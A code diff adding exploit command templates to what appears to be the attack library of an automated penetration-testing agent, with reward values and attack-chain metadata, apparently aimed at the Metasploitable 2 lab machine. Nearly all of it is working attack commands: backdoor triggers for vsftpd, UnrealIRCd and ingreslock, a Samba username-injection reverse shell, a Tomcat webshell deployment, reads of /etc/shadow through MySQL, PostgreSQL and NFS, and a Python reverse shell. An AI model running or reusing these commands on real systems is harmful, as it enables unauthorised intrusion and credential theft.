@@ -888,6 +888,210 @@ register(CommandTemplate(
     tags={"portknock", "nmap"}
 ))
 
+# --- Phase 18: Direct Exploit Scripts (MSF-free) ---
+# These replace msfconsole-based exploits that can't maintain sessions.
+# Each targets a known backdoor/vulnerability with direct tool usage.
+
+register(CommandTemplate(
+    name="vsftpd_backdoor_nc",
+    template="echo -e 'USER backdoor:)\\nPASS anything' | timeout 5 nc -v {target} 21 && sleep 1 && timeout 10 nc -v {target} 6200",
+    description="Trigger vsftpd 2.3.4 backdoor via smiley-face user, then connect to shell on port 6200.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ftp_service_found"},
+    success_indicators=["uid=", "root", "Connected to", "6200"],
+    typical_reward=50.0,
+    tags={"vsftpd", "backdoor", "shell", "direct_exploit", "ms2"},
+    why="vsftpd 2.3.4 backdoor opens root shell on port 6200. No MSF needed.",
+    when="FTP found on port 21, service version is vsftpd 2.3.4.",
+    follows_after=["nmap_service_version", "ftp_enum"],
+    enables=["root_shell", "data_exfiltration"],
+))
+
+register(CommandTemplate(
+    name="vsftpd_backdoor_python",
+    template="python3 -c \"import socket; s=socket.socket(); s.connect(('{target}',21)); s.send(b'USER backdoor:)\\r\\n'); s.recv(1024); s.send(b'PASS x\\r\\n'); s.recv(1024); s.close(); import time; time.sleep(1); s2=socket.socket(); s2.connect(('{target}',6200)); s2.send(b'id\\n'); print(s2.recv(4096).decode(errors='ignore'))\"",
+    description="Python-based vsftpd 2.3.4 backdoor trigger. Opens shell on port 6200.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ftp_service_found"},
+    success_indicators=["uid=", "root", "6200"],
+    typical_reward=50.0,
+    tags={"vsftpd", "backdoor", "shell", "python", "direct_exploit", "ms2"},
+))
+
+register(CommandTemplate(
+    name="unrealircd_backdoor_nc",
+    template="echo 'AB; id; whoami; cat /etc/shadow | head -5' | timeout 10 nc -v {target} 6667",
+    description="UnrealIRCd 3.2.8.1 backdoor — 'AB;' prefix triggers command execution.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"irc_service_found"},
+    success_indicators=["uid=", "root", "shadow"],
+    typical_reward=50.0,
+    tags={"unrealircd", "backdoor", "shell", "direct_exploit", "ms2"},
+    why="UnrealIRCd backdoor executes any command after 'AB;' prefix. Instant root.",
+    when="IRC service found on port 6667, version is UnrealIRCd 3.2.8.1.",
+    follows_after=["nmap_service_version"],
+    enables=["root_shell", "data_exfiltration"],
+))
+
+register(CommandTemplate(
+    name="ingreslock_shell",
+    template="{ echo 'id; whoami; uname -a; cat /etc/shadow | head -5'; sleep 3; } | timeout 15 telnet {target} 1524",
+    description="Ingreslock backdoor on port 1524 — instant root shell, no auth required.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["uid=", "root", "shadow", "Connected"],
+    typical_reward=50.0,
+    tags={"ingreslock", "backdoor", "shell", "direct_exploit", "ms2"},
+    why="Port 1524 ingreslock backdoor gives instant root. Easiest path on MS2.",
+    when="Port 1524 is open (detected by nmap).",
+    follows_after=["nmap_full_tcp"],
+    enables=["root_shell", "data_exfiltration"],
+))
+
+register(CommandTemplate(
+    name="samba_usermap_exploit",
+    template="echo 'nohup nc -e /bin/bash {target} 4444 &' | timeout 10 smbclient //{target}/tmp -U './=`nohup nc -e /bin/bash {target} 4444`' -N --option='client min protocol=NT1' 2>/dev/null; echo 'Triggered CVE-2007-2447'",
+    description="Samba 3.0.20 username map script RCE (CVE-2007-2447). Triggers reverse shell.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"smb_service_found"},
+    success_indicators=["session", "connected", "Triggered"],
+    typical_reward=40.0,
+    tags={"samba", "rce", "cve-2007-2447", "direct_exploit", "ms2"},
+    why="Samba usermap_script allows arbitrary command execution via username field.",
+    when="SMB found on 139/445, Samba version 3.0.20-3.0.25.",
+    follows_after=["smb_enum", "nmap_service_version"],
+    enables=["root_shell"],
+))
+
+register(CommandTemplate(
+    name="tomcat_war_deploy",
+    template="curl -s -u tomcat:tomcat 'http://{target}:8180/manager/deploy?path=/pwned&war=file:///usr/share/laudanum/jsp/cmd.war' && curl -s 'http://{target}:8180/pwned/cmd.jsp?cmd=id'",
+    description="Tomcat default creds (tomcat:tomcat) — deploy WAR shell via manager API.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"http_service_found"},
+    success_indicators=["uid=", "OK", "deployed"],
+    typical_reward=30.0,
+    tags={"tomcat", "war", "deploy", "webshell", "direct_exploit", "ms2"},
+    why="Tomcat manager with default creds allows WAR file deployment for RCE.",
+    when="Tomcat found on 8180 (MS2) or 8080. Try default creds first.",
+    follows_after=["http_enum", "nmap_service_version"],
+    enables=["shell_access", "webshell"],
+))
+
+register(CommandTemplate(
+    name="mysql_noauth_root",
+    template="mysql -h {target} -u root -e 'SELECT user,password FROM mysql.user; SELECT @@version; SELECT LOAD_FILE(\"/etc/shadow\")' 2>/dev/null",
+    description="MySQL root with no password — direct database access and file read.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"mysql_service_found"},
+    success_indicators=["root", "mysql", "version", "shadow"],
+    typical_reward=25.0,
+    tags={"mysql", "noauth", "direct_exploit", "ms2"},
+    why="MySQL on MS2 has no root password. Can read /etc/shadow via LOAD_FILE().",
+    when="MySQL found on port 3306.",
+    follows_after=["nmap_service_version"],
+    enables=["credential_discovery", "data_exfiltration"],
+))
+
+register(CommandTemplate(
+    name="postgres_default_rce",
+    template="PGPASSWORD=postgres psql -h {target} -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id; whoami; cat /etc/shadow | head -3'\" 2>/dev/null || PGPASSWORD=postgres psql -h {target} -U postgres -c 'SELECT version(); SELECT usename,passwd FROM pg_shadow;'",
+    description="PostgreSQL default creds (postgres:postgres) — COPY TO PROGRAM for RCE.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"postgres_service_found"},
+    success_indicators=["uid=", "root", "postgres", "md5"],
+    typical_reward=30.0,
+    tags={"postgres", "rce", "default_creds", "direct_exploit", "ms2"},
+    why="PostgreSQL with default creds allows RCE via COPY TO PROGRAM.",
+    when="PostgreSQL found on port 5432.",
+    follows_after=["nmap_service_version"],
+    enables=["shell_access", "credential_discovery"],
+))
+
+register(CommandTemplate(
+    name="rlogin_noauth",
+    template="timeout 10 rlogin -l root {target}",
+    description="rlogin to target as root — no authentication on old systems.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["#", "root@", "Last login"],
+    typical_reward=40.0,
+    tags={"rlogin", "noauth", "shell", "direct_exploit", "ms2"},
+    why="rlogin on port 513 often requires no authentication. Instant root on MS2.",
+    when="Port 513 (rlogin) is open.",
+    follows_after=["nmap_full_tcp"],
+    enables=["root_shell"],
+))
+
+register(CommandTemplate(
+    name="vnc_password_connect",
+    template="timeout 10 vncviewer {target}:5900 -passwd /dev/stdin <<< 'password' 2>/dev/null || echo 'VNC password: password (try manually)'",
+    description="VNC with default password 'password'. Desktop access.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"ports_discovered"},
+    success_indicators=["Connected", "VNC", "desktop"],
+    typical_reward=20.0,
+    tags={"vnc", "default_password", "direct_exploit", "ms2"},
+    why="VNC on MS2 uses password 'password'. Provides desktop access.",
+    when="Port 5900 (VNC) is open.",
+    follows_after=["nmap_full_tcp"],
+    enables=["shell_access"],
+))
+
+register(CommandTemplate(
+    name="nfs_mount_root",
+    template="mkdir -p /tmp/nfs_mount && mount -t nfs {target}:/ /tmp/nfs_mount -o nolock 2>/dev/null && ls -la /tmp/nfs_mount/root/ && cat /tmp/nfs_mount/etc/shadow | head -5",
+    description="Mount NFS root share — read entire filesystem including /etc/shadow.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    preconditions={"nfs_service_found"},
+    success_indicators=["root", "shadow", "nfs_mount"],
+    typical_reward=35.0,
+    tags={"nfs", "mount", "file_read", "direct_exploit", "ms2"},
+    why="NFS world-readable export allows mounting entire root filesystem.",
+    when="NFS found on port 2049. showmount confirms '/' is exported.",
+    follows_after=["showmount", "nmap_service_version"],
+    enables=["credential_discovery", "data_exfiltration", "ssh_key_plant"],
+))
+
+register(CommandTemplate(
+    name="python_reverse_shell",
+    template="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+    description="Python reverse shell — connect back to attacker listener.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "port"],
+    preconditions={"ports_discovered"},
+    success_indicators=["$", "#", "bash"],
+    typical_reward=15.0,
+    tags={"reverse_shell", "python", "shell"},
+    why="Standard reverse shell payload. Use when you can inject commands.",
+    when="Have code execution and need interactive shell.",
+))
+
+register(CommandTemplate(
+    name="tty_stabilize",
+    template="python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || script -qc /bin/bash /dev/null",
+    description="Stabilize TTY in reverse/bind shell for full interactive terminal.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=[],
+    preconditions={"linux_shell_obtained"},
+    success_indicators=["$", "#", "bash-"],
+    typical_reward=3.0,
+    tags={"tty", "shell", "stabilize"},
+    why="Raw shells don't support job control, tab completion, or Ctrl+C properly.",
+    when="Have a raw shell (nc, telnet). Run immediately after gaining shell.",
+))
+
 # =============================================================================
 # PHASE 4: PRIVILEGE ESCALATION
 # =============================================================================
